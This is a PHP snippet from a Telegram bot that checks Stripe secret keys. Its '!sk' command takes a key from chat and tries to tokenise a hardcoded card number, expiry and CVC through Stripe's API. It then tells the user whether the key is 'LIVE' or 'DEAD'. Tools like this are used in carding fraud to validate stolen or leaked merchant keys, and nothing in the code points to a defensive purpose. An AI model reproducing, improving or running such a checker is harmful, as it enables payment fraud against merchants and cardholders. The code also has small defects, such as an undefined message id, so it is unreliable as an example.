//////////=========[Sk Key Check Command]=========//////////

elseif (strpos($message, "!sk") === 0){
$sec = substr($message, 4);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');
$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($ch);
if (strpos($result, 'api_key_expired')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>Bot Made by: Lucas </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>Bot Made by: Lucas </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>Bot Made by: Lucas </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>Bot Made by: Lucas </b>");
}}


////////////////////////////////////////////////////////////////////////////////////////////////

function sendMessage ($chatId, $message){
$url = $GLOBALS[website]."/sendMessage?chat_id=".$chatId."&text=".$message."&reply_to_message_id=".$message_id."&parse_mode=HTML";
file_get_contents($url);      
}

////////////////=============[Lucas]===============////////////////
////////==========[Used api raw bot of IBZ]============////////

?>
